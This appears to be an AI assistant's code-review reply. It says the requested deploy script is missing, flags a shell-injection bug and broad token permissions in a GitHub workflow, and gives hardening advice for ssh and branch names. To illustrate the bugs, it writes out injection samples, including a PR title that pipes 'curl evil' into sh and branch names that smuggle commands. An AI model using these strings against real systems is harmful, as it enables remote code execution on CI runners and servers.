I couldn't find the script you described. Nothing in this workspace runs `ssh` or puts a branch name into a command string, so I haven't reviewed it. Could you send me its path, or check whether it's been committed to this branch?

**What's here instead:**

- **`.github/workflows/deploy.yml`** is the closest thing to a deploy script. It doesn't use ssh or a branch name, but it has two serious problems before it goes anywhere near CI:
  - **Line 14:** `run: echo "Title is ${{ github.event.pull_request.title }}"` pastes the PR title straight into the shell script before the shell runs it. Anyone who opens a PR can run commands on the runner with a title like `"; curl evil | sh; #`. This is the same kind of bug you're worried about with the branch name. To fix it, pass the title in through `env:` (`env: TITLE: ${{ github.event.pull_request.title }}`) and reference it in the script as `"${TITLE}"`.
  - **Line 7:** `permissions: write-all` on a `pull_request` trigger gives the job's token every write permission. Lower it to `contents: read` unless a step really needs more.
- **`scripts/backup.sh`** uses `scp`, not `ssh`, and none of its input comes from users. It still falls short of a basic standard:
  - It has no `set -Eeuo pipefail`. If `tar` fails, `scp` still runs and the script still exits 0.
  - The temp directory `/tmp/backup.$$` has a predictable name, so another user on the machine can set a symlink trap there. Use `mktemp -d` instead.
  - It only cleans up on the last line, so a failure or signal leaves the backup data in `/tmp`. It needs a `trap … EXIT`.
  - None of the expansions are quoted, and it uses backtick `date` instead of `$(…)`.

**When you send the deploy script, I'll check it against these points.** These are the usual safe patterns for a branch name in a remote ssh command:

1. **Check the branch name at the start against an allowlist, and reject anything that fails.** For example, `[[ ${branch} =~ ^[A-Za-z0-9._/-]+$ && ${branch} != -* && ${branch} != *..* ]] || exit 2`. Don't try to clean up bad names. Git allows branch names that are dangerous in a shell, such as `` foo$(id) ``, ``foo`id` ``, and `foo;id`.
2. **Remember that ssh puts all its arguments back into one string and the remote shell parses it again.** Using an array on your side doesn't protect you. Either:
   - send a fixed script over stdin with `ssh host bash -s -- "${branch@Q}" < remote.sh`, or
   - quote the value with `printf -v q '%q' "${branch}"` and run `ssh host "deploy ${q}"`.
   
   Neither replaces step 1.
3. **Put `--` before positional arguments** and `--` after the host name (`ssh -- "${host}" …`), so a branch or host starting with `-` can't be read as an option.
4. **In CI, take the branch from `env:` (for example `GITHUB_HEAD_REF`) rather than `${{ }}`**, for the same reason as the PR-title bug above.
